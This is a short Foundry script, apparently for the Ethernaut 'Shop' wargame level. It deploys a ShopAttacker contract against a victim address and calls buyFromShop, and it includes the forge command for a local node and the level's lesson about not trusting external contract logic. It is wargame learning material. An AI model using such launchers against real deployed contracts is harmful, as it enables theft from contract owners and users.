// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";
import {ShopAttacker} from "../src/ShopAttacker.sol";

contract ShopAttackExecuter is Script, HelperConfigLib {
    function run(address _victimAddr) external {
        vm.startBroadcast(ATTACKER_KEY);
        ShopAttacker attacker = new ShopAttacker(_victimAddr);
        attacker.buyFromShop();
        vm.stopBroadcast();
    }
}

/**
 * forge script ./script/ShopAttackExecuter.s.sol:ShopAttackExecuter --sig "run(address)" <VICTIM-ADDRESS> --rpc-url http://127.0.0.1:8545 --broadcast -vvv
 * 
 Success Message:
 * Contracts can manipulate data seen by other contracts in any way they want.
 * It's unsafe to change the state based on external and untrusted contracts logic.
 */
